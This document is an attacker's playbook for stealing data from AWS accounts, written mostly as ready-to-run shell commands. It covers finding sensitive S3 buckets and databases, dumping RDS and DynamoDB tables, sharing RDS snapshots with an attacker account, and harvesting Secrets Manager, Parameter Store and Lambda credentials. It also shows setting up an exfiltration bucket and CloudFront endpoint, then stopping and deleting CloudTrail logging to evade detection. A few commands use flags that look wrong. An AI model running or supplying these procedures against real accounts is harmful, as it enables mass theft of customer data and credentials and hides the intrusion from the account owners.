# AWS Data Exfiltration

Techniques for identifying and exfiltrating data from AWS environments.

## Data Discovery

### Find Sensitive S3 Buckets

```bash
# Search for sensitive bucket names
aws s3 ls | grep -i "backup\|archive\|data\|database\|customer\|financial\|sensitive"

# Enumerate all buckets
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "=== Bucket: $bucket ==="
  aws s3api get-bucket-location --bucket $bucket
  aws s3api get-bucket-versioning --bucket $bucket | jq '.Status'
done

# Find buckets with public access
aws s3api list-buckets --query 'Buckets[].Name' -o tsv | while read bucket; do
  POLICY=$(aws s3api get-bucket-policy --bucket $bucket 2>/dev/null | jq '.Policy | fromjson')
  echo "$POLICY" | grep -q "Principal.*\*" && echo "PUBLIC: $bucket"
done

# Find sensitive content by file patterns
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3 ls s3://$bucket/ --recursive | grep -i "\.bak\|\.sql\|\.csv\|export\|dump\|backup"
done
```

### Database Enumeration

```bash
# Find RDS instances
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,DBInstanceStatus,Engine,MasterUsername]' -o table

# Check database size and location
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,AllocatedStorage,AvailabilityZone]' -o table

# Find publicly accessible databases
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==true].[DBInstanceIdentifier]' -o tsv

# Enumerate ElastiCache
aws elasticache describe-cache-clusters --show-cache-node-info | jq '.CacheClusters[] | {CacheClusterId, CacheNodeType, Engine}'

# DynamoDB tables
aws dynamodb list-tables --query 'TableNames' -o tsv | while read table; do
  SIZE=$(aws dynamodb describe-table --table-name $table --query 'Table.TableSizeBytes')
  echo "$table: $SIZE bytes"
done
```

## RDS Exfiltration

### Direct Database Connection

```bash
# Get database endpoint and credentials
ENDPOINT=$(aws rds describe-db-instances --db-instance-identifier {dbName} \
  --query 'DBInstances[0].Endpoint.Address' -o tsv)

MASTER_USER=$(aws rds describe-db-instances --db-instance-identifier {dbName} \
  --query 'DBInstances[0].MasterUsername' -o tsv)

# Connect to PostgreSQL
PGPASSWORD={password} psql -h $ENDPOINT -U $MASTER_USER -d {database} -c "SELECT * FROM sensitive_table;" > data.csv

# Connect to MySQL
mysql -h $ENDPOINT -u $MASTER_USER -p{password} {database} -e "SELECT * FROM customers;" > customers.sql

# Connect to SQL Server
sqlcmd -S $ENDPOINT -U $MASTER_USER -P {password} -d {database} \
  -Q "SELECT * FROM sensitive_data" > data.txt

# Export large table
mysql -h $ENDPOINT -u $MASTER_USER -p{password} {database} \
  -e "SELECT * FROM huge_table" | gzip > huge_table.sql.gz
```

### RDS Snapshot Exfiltration

```bash
# Create snapshot
aws rds create-db-snapshot \
  --db-instance-identifier {dbName} \
  --db-snapshot-identifier exfil-snapshot-$(date +%s)

# Wait for snapshot
aws rds describe-db-snapshots --db-snapshot-identifier exfil-snapshot-123 \
  --query 'DBSnapshots[0].Status'

# Share with attacker account
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier exfil-snapshot-123 \
  --attribute-name restore \
  --values-to-add arn:aws:iam::{attacker-account}:root

# In attacker account, restore database
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier restored-db \
  --db-snapshot-identifier arn:aws:rds:{region}:{victim-account}:snapshot:exfil-snapshot-123

# Access restored database
psql -h restored-db.c9akciq32.us-east-1.rds.amazonaws.com -U admin -d {db}
```

## S3 Bulk Export

### Parallel S3 Download

```bash
# Download entire bucket
aws s3 sync s3://{bucketName} ./downloaded-data/ --recursive

# With parallel threads
aws s3 sync s3://{bucketName} ./downloaded-data/ --recursive --region us-east-1

# Download with filtering
aws s3 sync s3://{bucketName}/sensitive/ ./data/ --recursive --exclude "*" --include "*.csv"

# Estimate transfer time
aws s3 ls s3://{bucketName} --recursive --human-readable --summarize | tail -1

# Resume interrupted transfer
aws s3 sync s3://{bucketName} ./data/ --recursive --metadata-directive COPY
```

### S3 Select for Large Datasets

```bash
# Query data without downloading entire file
aws s3api select-object-content \
  --bucket {bucket} \
  --key {key} \
  --expression 'SELECT * FROM s3object WHERE age > 30' \
  --expression-type SQL \
  --input-serialization '{"CSV":{}}' \
  --output-serialization '{"CSV":{}}' \
  output.csv

# Compress output
aws s3api select-object-content \
  --bucket {bucket} \
  --key large-file.csv \
  --expression 'SELECT * FROM s3object LIMIT 100000' \
  --expression-type SQL \
  --input-serialization '{"CSV":{"AllowQuotedRecordDelimiter":true}}' \
  --output-serialization '{"CSV":{}}' | gzip > partial-data.csv.gz
```

## DynamoDB Extraction

### DynamoDB Scan Export

```bash
# Scan entire table
aws dynamodb scan --table-name {tableName} > table-dump.json

# Export with pagination
aws dynamodb scan --table-name {tableName} --output json | jq '.Items' > items.json

# Parallel scans for large tables
aws dynamodb scan --table-name {tableName} --segment 0 --total-segments 4 > segment0.json &
aws dynamodb scan --table-name {tableName} --segment 1 --total-segments 4 > segment1.json &
aws dynamodb scan --table-name {tableName} --segment 2 --total-segments 4 > segment2.json &
aws dynamodb scan --table-name {tableName} --segment 3 --total-segments 4 > segment3.json &
wait

# Query specific data
aws dynamodb query --table-name {tableName} \
  --key-condition-expression "pk = :pk" \
  --expression-attribute-values '{":pk":{"S":"customer123"}}' > customer-data.json

# Create backup for export
aws dynamodb create-backup --table-name {tableName} --backup-name exfil-backup

# Export to S3 via Data Pipeline (if using Point-in-Time Recovery)
aws dynamodb export-table-to-point-in-time \
  --table-arn arn:aws:dynamodb:us-east-1:{account}:table/{tableName} \
  --s3-bucket {exfil-bucket} \
  --s3-prefix exfil/
```

## Secrets Manager & Parameter Store

### Extract Secrets

```bash
# List all secrets
aws secretsmanager list-secrets --query 'SecretList[].Name' -o tsv | while read secret; do
  echo "=== Secret: $secret ==="
  aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' -o text
done > all-secrets.txt

# Get database credentials
aws secretsmanager get-secret-value --secret-id prod/database | jq '.SecretString | fromjson'

# Extract RDS credentials and use
CREDS=$(aws secretsmanager get-secret-value --secret-id prod/rds | jq '.SecretString | fromjson')
DB_USER=$(echo $CREDS | jq -r '.username')
DB_PASS=$(echo $CREDS | jq -r '.password')
DB_HOST=$(echo $CREDS | jq -r '.host')

psql -h $DB_HOST -U $DB_USER -p 5432 -d postgres -c "\\dt"

# Parameter Store
aws ssm get-parameters-by-path --path /prod/ --recursive --with-decryption --query 'Parameters[]' -o json > params.json
```

## Lambda Environment Variable Exfiltration

```bash
# Get function configuration including environment variables
aws lambda get-function-configuration --function-name {functionName} | jq '.Environment.Variables'

# Environment variables often contain:
# - Database credentials
# - API keys
# - Third-party service tokens
# - Encryption keys

# Extract and use database credentials
DB_HOST=$(aws lambda get-function-configuration --function-name {functionName} | \
  jq -r '.Environment.Variables.DB_HOST')

DB_USER=$(aws lambda get-function-configuration --function-name {functionName} | \
  jq -r '.Environment.Variables.DB_USER')

# Connect and query
mysql -h $DB_HOST -u $DB_USER -p{password} -e "SELECT * FROM sensitive_table;"
```

## CloudWatch Logs Exfiltration

```bash
# List all log groups
aws logs describe-log-groups --query 'logGroups[].logGroupName' -o tsv

# Find suspicious log groups
aws logs describe-log-groups | jq '.logGroups[] | select(.logGroupName | test("app|auth|access|error"))'

# Export logs
aws logs create-export-task \
  --from 1000000000 \
  --to 2000000000 \
  --log-group-name {logGroup} \
  --s3-bucket {exfil-bucket} \
  --s3-prefix logs/

# Or directly retrieve
aws logs filter-log-events --log-group-name {logGroup} --query 'events[].message' -o text > logs.txt

# Search for sensitive data in logs
aws logs filter-log-events --log-group-name {logGroup} \
  --filter-pattern "[ERROR]" --query 'events[].message' -o text | \
  grep -i "password\|key\|secret\|token"
```

## Exfiltration Infrastructure

### Create Attacker-Controlled S3 Bucket

```bash
# Create bucket for receiving data
aws s3 mb s3://exfil-{random}/ --region us-east-1

# Remove block public access (for external access)
aws s3api put-public-access-block \
  --bucket exfil-{random} \
  --public-access-block-configuration \
  "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false"

# Create bucket policy allowing upload from compromised role
cat > bucket-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::{victim-account}:role/{compromised-role}"
      },
      "Action": ["s3:PutObject", "s3:PutObjectAcl"],
      "Resource": "arn:aws:s3:::exfil-{random}/*"
    }
  ]
}
EOF

aws s3api put-bucket-policy --bucket exfil-{random} --policy file://bucket-policy.json

# Upload from victim environment
aws s3 cp sensitive-data.tar.gz s3://exfil-{random}/ --profile victim-account
```

### CloudFront Distribution for Data Delivery

```bash
# Create CloudFront distribution pointing to exfil S3
aws cloudfront create-distribution \
  --distribution-config '{
    "CallerReference": "exfil-'$(date +%s)'",
    "Origins": {
      "Quantity": 1,
      "Items": [{
        "Id": "S3Origin",
        "DomainName": "exfil-{random}.s3.amazonaws.com",
        "S3OriginConfig": {}
      }]
    }
  }' > distribution.json

DIST_ID=$(cat distribution.json | jq -r '.Distribution.Id')

# Data available at CloudFront endpoint
DISTRIBUTION=$(cat distribution.json | jq -r '.Distribution.DomainName')
# Download via: https://{DISTRIBUTION}/data.tar.gz
```

## Evasion & Cleanup

```bash
# Exfiltration creates CloudTrail events
# Spread over time to avoid detection
# Use legitimate AWS services when possible

# Monitor for alerts
aws cloudwatch describe-alarms

# If you have permissions, delete/modify CloudTrail
aws cloudtrail stop-logging --name default
aws cloudtrail delete-trail --name default

# Or just ensure logs don't go to your target account
aws cloudtrail describe-trails --query 'trailList[].S3BucketName' -o tsv

# Clean up created resources
aws s3 rb s3://exfil-{random}/ --force
aws dynamodb delete-backup --backup-arn {backupArn}
aws rds delete-db-snapshot --db-snapshot-identifier exfil-snapshot-123
```

## Speed Considerations

```bash
# Large dataset transfer times
# S3: ~100 MB/s typical
# RDS export to S3: Time varies by database size

# Optimize for speed
# Compress data before transfer
tar -czf data.tar.gz ./sensitive-data
# Results in 10-30x compression for structured data

# Parallel uploads
aws s3 sync ./data s3://exfil-bucket/ --recursive --metadata-directive COPY

# Use S3 Transfer Acceleration (if available)
aws s3 cp data.tar.gz s3://exfil-bucket/ --use-accelerate-endpoint
```

## Key Data Targets

- RDS databases (customer data, financial records)
- S3 buckets (backups, exports, archives)
- DynamoDB tables (NoSQL application data)
- Secrets Manager (credentials, API keys)
- Parameter Store (configuration, secrets)
- CloudWatch Logs (application activity, errors)
- Lambda environment variables (API keys, tokens)
- EBS snapshots (virtual machine data)
- Database backups (complete database copies)
